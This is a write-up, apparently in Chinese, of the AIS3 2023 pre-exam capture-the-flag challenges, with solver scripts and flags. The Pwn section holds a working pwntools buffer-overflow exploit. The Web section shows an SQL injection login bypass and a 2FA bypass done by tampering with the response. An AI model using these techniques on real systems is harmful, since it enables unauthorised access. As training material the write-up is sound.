# AIS3 2023 pre-exam writeup


<br>
    
## Misc
---

- ### Welcome

開啟welcome.pdf，並參考提示。

**flag**:
```
AIS3{WELCOME-TO-2023-PRE-EXAM-&-MY-FIRST-CTF}
```

  
- ### Robot

`nc chals1.ais3.org 12348` 後回答問題，最後得出**flag**:
```
AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}  
```
<br>
    
## Pwn
---

- ### Simply Pwn

使用IDA pro 反編譯，發現可以利用buffer overflow，填入79個字元後buffer被填滿，此時可以使其跳到chellcode位置(0x4017a5)，並傳入指令 `cat ./FLAG`，程式碼如下:

```
from pwn import *

p = remote("chals1.ais3.org", 11111)


payload = b"A" * 79 
payload += p64(0x4017a5)  
p.sendline(payload)
f='cat ./FLAG'
p.sendline(f)
response = p.recvline()


print(response)


p.interactive()

```
得到**flag:**
```
AIS3{5imP1e_Pwn_4_beGinn3rs!}
```

<br>

## Web
---

- ### Login Panel

先使用Username:`guset`，Password:`guset`，查看結構。
發現網頁會先跳到2fa頁面，再進入Dashboard，且其告知:
Only admin can see the flag.

查看app.js，發現可以利用injection，Username:`admin`，Password:`' or 1=1 --`進入2fa頁面，但Submit時出現Invalid code。

利用Burp Suite更改response的封包，將 `Location: /2fa?msg=invalid_code` 改為 `Location: /dashboard`。

成功進入 admin 的 dashboard，得到**flag**:
```
 AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}
```     
<br> 
    
## Reverse 
---

- ### Simply Reverse
使用 IDA pro 反編譯，發現程式檢查最後輸入:`encrypted[i] == (((i ^ j)) << ((i ^ 9) & 3) | ((i ^ j)) >> (8 - ((i ^ 9) & 3))) + 8`

使用暴力破解回推，但發現有的字元無法回推到明文，推測是加密後的值超過16bits，但程式中的encrypted只記錄後16bits。

故修改程式碼，若16bit無法找到明文，便往上從17個bits開始檢查，程式碼如下:
```

encrypted = [0x8A, 0x50, 0x92, 0xC8, 0x06, 0x3D, 0x5B, 0x95, 0xB6, 0x52, 0x1B, 0x35, 0x82, 0x5A, 0xEA, 0xF8,
0x94, 0x28, 0x72, 0xDD, 0xD4, 0x5D, 0xE3, 0x29, 0xBA, 0x58, 0x52, 0xA8, 0x64, 0x35, 0x81, 0xAC, 0x0A, 0x64]

a1 = [0] * len(encrypted)
i = 0

while i < 34:
for j in range(256):
if encrypted[i] == (((i ^ j)) << ((i ^ 9) & 3) | ((i ^ j)) >> (8 - ((i ^ 9) & 3))) + 8:
a1[i] = j
break
while a1[i] == 0:
encrypted[i] += 0x100
for j in range(256):
if encrypted[i] == (((i ^ j)) << ((i ^ 9) & 3) | ((i ^ j)) >> (8 - ((i ^ 9) & 3))) + 8:
a1[i] = j
break

i += 1
a1 = ''.join(chr(num) for num in a1)
print(a1) 
```

得到**flag**:
```
AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}
```

- ### Flag Sleeper

使用IDA pro 反編譯，發現程式在`a2[1][v7] == (v10[v6] ^ v9[v6]) ` 的條件之下才會執行sleep()。
故推測值為0~52的`v8[]`為明文的index，故將`v10[] ^ v9[]`後依`v8[]`的值排列，程式碼如下:
```
v8 = [10, 12, 28, 7, 38, 31, 47, 44, 42, 35, 48, 30, 21, 11, 17, 16, 34, 40, 33, 39, 41, 9, 22, 4, 6, 20, 19, 46, 23, 45, 26, 0, 15, 3, 8, 43, 14, 5, 2, 27, 49, 1, 51, 36, 37, 24, 25, 50, 32, 13, 29, 18]
v9 = [212, 232, 164, 28, 253, 132, 194, 47, 46, 150, 96, 216, 121, 216, 140, 164, 49, 219, 147, 252, 201, 28, 9, 188, 155, 79, 133, 255, 104, 20, 87, 64, 147, 143, 68, 147, 142, 96, 165, 244, 62, 58, 119, 25, 61, 56, 71, 182, 7, 37, 1, 154]
v10  = [237, 217, 212, 40, 149, 219, 165, 112, 29, 241, 8, 189, 13, 224, 211, 149, 5, 184, 255, 207, 162, 122, 86, 199, 170, 122, 240, 206, 9, 102, 102, 1, 163, 188, 119, 225, 239, 3, 246, 153, 9, 115, 10, 70, 94, 103, 52, 137, 97, 29, 109, 208]
v11=[0]*60

for i in range(len(v8)):
    x = v8[i]
    v11[x]=v10[i]^v9[i]

v11 = ''.join([chr(i) for i in v11])
print(v11)

```

得到**flag**:
```
AIS3{c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?}
```    
<br>
      
## Crypto
---

- ### Fernet

檢查 `chal.py` 的 `encrypt()`，其步驟如下:

1. 其使用 leak_password 和 salt 透過 PBKDF2 和 SHA256 生成一個 32 byte 的 key。
2. 然後使用生成的key 作為 Fernet 的參數。
3. 將明文編碼，並使用 Fernet() 後的值對其進行加密，得到密文。
5. 將 salt 和密文連接，並進行 Base64 編碼，得到最終的密文。

反推程式碼如下:
```
import base64
from cryptography.fernet import Fernet
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2

def decrypt(ciphertext, password):
    decoded_data = base64.b64decode(ciphertext.encode())
    salt = decoded_data[:16]
    ciphertext = decoded_data[16:]
    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
    f = Fernet(base64.urlsafe_b64encode(key))
    plaintext = f.decrypt(ciphertext).decode()
    return plaintext

ciphertext = "iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj"
leak_password = "mysecretpassword"


plaintext = decrypt(ciphertext, leak_password)
print(plaintext)

```

得到**flag**:
```
FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!_!!!_!}
```
